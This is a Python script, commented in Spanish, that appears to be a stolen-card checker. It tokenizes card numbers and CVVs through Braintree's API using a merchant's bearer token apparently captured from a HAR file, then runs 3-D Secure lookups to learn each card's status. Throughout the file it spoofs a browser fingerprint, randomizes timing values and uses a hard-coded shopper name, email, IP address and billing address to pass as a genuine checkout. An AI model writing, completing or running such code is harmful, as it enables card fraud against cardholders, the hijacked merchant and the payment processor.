import httpx
import asyncio
import base64
import urllib.parse
import re
import random

# Constantes de identidad
U_SID = "1bcc6b9b-2d9d-4d05-8557-aa341f329650"
U_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"

def capture(string, start, end):
    try:
        start_pos = string.find(start)
        if start_pos == -1: return None
        start_pos += len(start)
        end_pos = string.find(end, start_pos)
        if end_pos == -1: return None
        return string[start_pos:end_pos]
    except: return None

async def check_braintree_3d(card_data, session, bearer, stats, semaphore):
    async with semaphore:
        if stats['token_dead']: return None
        
        try:
            p = re.findall(r'\d+', card_data)
            if len(p) < 4: return {"card": card_data, "status": "Error Formato"}
            cc, mm, aa, cvv = p[0], p[1], p[2], p[3]
            if len(aa) == 2: aa = "20" + aa

            h_api = {
                "authorization": f"Bearer {bearer}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "user-agent": U_AGENT
            }

            # Tokenizar
            p_tok = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": U_SID},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": aa, "cvv": cvv}}},
                "operationName": "TokenizeCreditCard"
            }
            
            r_tok = await session.post("https://payments.braintree-api.com/graphql", headers=h_api, json=p_tok)
            
            if r_tok.status_code == 401:
                stats['token_dead'] = True
                return {"card": card_data, "status": "Bearer Expired"}

            tok = capture(r_tok.text, '"token":"', '"')
            if not tok: return {"card": f"{cc}|{mm}|{aa}|{cvv}", "status": "Token Error"}

            # Lookup
            p_look = {
                "amount": "31.06", # Monto capturado en el HAR 
                "bin": cc[:6],
                "browserColorDepth": 32,
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "es-US",
                "browserScreenHeight": 864,
                "browserScreenWidth": 1536,
                "browserTimeZone": 360,
                "deviceChannel": "Browser",
                "additionalInfo": {
                    "shippingGivenName": "Melissa",
                    "shippingSurname": "Hopkins Garza",
                    "ipAddress": "45.173.218.10", # IP capturada en el HAR 
                    "billingLine1": "45 Calle",
                    "billingCity": "Santiago",
                    "billingPostalCode": "8361333",
                    "billingCountryCode": "PL",
                    "email": "janep5413@gmail.com"
                },
                "dfReferenceId": f"1_{U_SID}", 
                "clientMetadata": {
                    "requestedThreeDSecureVersion": "2",
                    "sdkVersion": "web/3.133.0",
                    "cardinalDeviceDataCollectionTimeElapsed": random.randint(200, 500),
                    "issuerDeviceDataCollectionTimeElapsed": random.randint(300, 600),
                    "issuerDeviceDataCollectionResult": True
                },
                "authorizationFingerprint": bearer,
                "braintreeLibraryVersion": "braintree/web/3.133.0",
                "_meta": {
                    "merchantAppId": "giftstomorrow.co.uk",
                    "platform": "web",
                    "sdkVersion": "3.133.0",
                    "source": "client",
                    "integration": "custom",
                    "integrationType": "custom",
                    "sessionId": U_SID
                }
            }
            
            r_look = await session.post(f"https://api.braintreegateway.com/merchants/ttn638rpstnkt23b/client_api/v1/payment_methods/{tok}/three_d_secure/lookup", json=p_look)
            res = r_look.json()
            status = res.get("paymentMethod", {}).get("threeDSecureInfo", {}).get("status", "N/A")
            
            return {"card": f"{cc}|{mm}|{aa}|{cvv}", "status": status}

        except Exception as e:
            return {"card": card_data, "status": f"Error: {str(e)[:20]}"}